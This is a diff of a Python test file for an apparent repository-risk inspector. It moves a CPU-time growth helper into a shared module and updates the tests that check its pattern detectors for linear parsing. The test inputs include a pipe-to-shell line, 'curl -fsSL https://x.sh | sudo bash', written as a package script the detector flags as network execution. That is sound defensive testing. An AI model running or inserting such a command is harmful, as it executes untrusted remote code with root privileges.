@@ -5,15 +5,12 @@
 
 from __future__ import annotations
 
-import gc
 import json
 import os
 import subprocess
-import time
 from collections.abc import Callable
 from functools import partial
 from pathlib import Path
-from typing import Any
 
 import pytest
 
@@ -23,6 +20,7 @@ from dokimi.repos.environment import files as F
 from dokimi.repos.environment import inspect_repo
 from dokimi.repos.environment.instructions import detect_instructions
 from dokimi.repos.source import GitTree, WorkTree
+from tests.growth_timing import GROWTH_LIMIT, growth
 
 SETTINGS = {"hooks": {
     "SessionStart": [{"hooks": [{"type": "command", "command": "npm ci && npm run build"}]}],
@@ -86,28 +84,8 @@ def _rules(payload: dict) -> dict[str, list]:
     return out
 
 
-GROWTH_LIMIT = 8  # CPU time at 4n over that at n: about 4 for linear work, 16 for quadratic
-
-
-def _growth(timed: Callable[[int], Callable[[], Any]], n: int, reps: int = 5) -> tuple[float, Any]:
-    """CPU time of the call ``timed(4 * n)`` returns over that of ``timed(n)``'s, and the call's result. The best
-    of ``reps`` interleaved runs each, GC off: a slow or busy runner slows both sizes, not the ratio (#505)."""
-    calls = [timed(n), timed(4 * n)]
-    best, result = [float("inf")] * 2, None
-    for _ in range(reps):
-        for k, call in enumerate(calls):
-            gc.disable()
-            try:
-                start = time.process_time()
-                result = call()
-                best[k] = min(best[k], time.process_time() - start)
-            finally:
-                gc.enable()
-    return best[1] / best[0], result
-
-
 def _inspected(tmp_path: Path, files: Callable[[int], dict[str, str]]) -> Callable[[int], Callable[[], dict]]:
-    """For :func:`_growth`: ``inspect_repo`` of a repository of ``files(size)``, git's file listing done once."""
+    """For :func:`~tests.growth_timing.growth`: ``inspect_repo`` of a repository of ``files(size)``, git's file listing done once."""
     def timed(size: int) -> Callable[[], dict]:
         _repo(tmp_path / str(size), files(size))
         tree = WorkTree(tmp_path / str(size))
@@ -320,7 +298,7 @@ def test_network_exec_pattern_is_linear_on_repeated_tokens(tmp_path):
     def files(k):
         scripts = {"boot": "curl -fsSL https://x.sh | sudo bash", "slow": "curl " * k}
         return {"AGENTS.md": "x\n", "package.json": json.dumps({"scripts": scripts})}
-    ratio, payload = _growth(_inspected(tmp_path, files), 2_000)
+    ratio, payload = growth(_inspected(tmp_path, files), 2_000)
     found = {s["source"] for s in payload["scripts"] if s["category"] == "network-exec"}
     assert found == {"package.json#scripts.boot"} and ratio < GROWTH_LIMIT
 
@@ -468,7 +446,7 @@ def test_deeply_nested_yaml_does_not_crash(tmp_path):
 
 def test_npm_install_1mb_completes_quickly(tmp_path):
     """A hook command of many options, up to just under the settings cap, is parsed in linear time."""
-    ratio, payload = _growth(_inspected(tmp_path, lambda k: _hook_files("npm " + "-npm " * k)), 5_000)
+    ratio, payload = growth(_inspected(tmp_path, lambda k: _hook_files("npm " + "-npm " * k)), 5_000)
     assert ratio < GROWTH_LIMIT  # at 4n, 750 KB: under MAX_SETTINGS_BYTES, so the hook is parsed
     assert [c["note"] for c in payload["capabilities"]] == ["hooks on SessionStart"]
 
@@ -587,7 +565,7 @@ def test_test_file_case_insensitive_and_mjs(tmp_path):
 
 def test_unbalanced_quote_in_hook_completes_quickly(tmp_path):
     """A hook with an unbalanced quote, up to just under the settings cap, is parsed in linear time."""
-    ratio, payload = _growth(_inspected(tmp_path, lambda k: _hook_files("echo '" + "a" * k)), 60_000)
+    ratio, payload = growth(_inspected(tmp_path, lambda k: _hook_files("echo '" + "a" * k)), 60_000)
     assert ratio < GROWTH_LIMIT  # shlex over the whole quote (no _MAX_SHLEX_LINE) is quadratic
     assert [c["note"] for c in payload["capabilities"]] == ["hooks on SessionStart"]
 
@@ -685,7 +663,7 @@ def test_hook_command_runs_repository_code(tmp_path, command, flagged):
     ("setup.cfg", "", "[", 5_000), ("build.gradle", "", "plugins {", 1_000), ("pom.xml", "<artifactId>", "checkstyle ", 1_000)])
 def test_manifest_readers_are_linear_on_repeated_tokens(tmp_path, path, head, token, n):
     files = _inspected(tmp_path, lambda k: {"AGENTS.md": "x", "setup.py": "", path: head + token * k})
-    assert _growth(files, n)[0] < GROWTH_LIMIT
+    assert growth(files, n)[0] < GROWTH_LIMIT
 
 
 def test_blob_less_clone_reads_manifests_in_few_requests(tmp_path, monkeypatch):
@@ -898,7 +876,7 @@ def test_an_npm_script_command_runs_repository_code(tmp_path, word):
                          ids=["lines", "spaces", "tabs"])
 def test_makefile_rules_are_linear(tmp_path, head, token, n):
     makefile = _inspected(tmp_path, lambda k: {"AGENTS.md": "x", "Makefile": head + token * k})
-    assert _growth(makefile, n)[0] < GROWTH_LIMIT
+    assert growth(makefile, n)[0] < GROWTH_LIMIT
 
 
 def test_a_file_matching_two_instruction_rules_has_one_finding_per_rule(tmp_path):
@@ -992,7 +970,7 @@ def test_the_committed_fixture_is_what_repo_inspect_emits(tmp_path):
 ], ids=["rm", "git-clean", "tsc", "pom"])
 def test_script_and_manifest_patterns_are_linear_on_hostile_strings(tmp_path, files, n):
     hostile = _inspected(tmp_path, lambda k: {"AGENTS.md": "x", **files(k)})
-    assert _growth(hostile, n)[0] < GROWTH_LIMIT
+    assert growth(hostile, n)[0] < GROWTH_LIMIT
 
 
 @pytest.mark.parametrize("body", ["{not json", "[1, 2]", ""])
@@ -1087,14 +1065,14 @@ def test_unclosed_heredocs_are_linear(tmp_path):
     """Many heredoc starts with no terminator, and many labels, must not scan the text per start."""
     from dokimi.repos.environment.risks import _segments
     hostile = lambda k: "bash <<A\n" + "<<A\n" * k + "".join(f"<<L{i}\n" for i in range(k))
-    assert _growth(lambda k: partial(_segments, hostile(k)), 10_000)[0] < GROWTH_LIMIT
+    assert growth(lambda k: partial(_segments, hostile(k)), 10_000)[0] < GROWTH_LIMIT
 
 
 def test_heredocs_opened_on_one_line_are_linear(tmp_path):
     """Several heredocs on one line read their bodies in turn, so the cost grows with the text, not its square."""
     from dokimi.repos.environment.risks import _segments
     hostile = lambda n: "bash " + " ".join(f"<<L{i}" for i in range(n)) + "\n" + "".join(f"echo x{i}\nL{i}\n" for i in range(n))
-    assert _growth(lambda n: partial(_segments, hostile(n)), 2_000)[0] < GROWTH_LIMIT
+    assert growth(lambda n: partial(_segments, hostile(n)), 2_000)[0] < GROWTH_LIMIT
 
 
 def test_redirection_keeps_its_fd_digit():
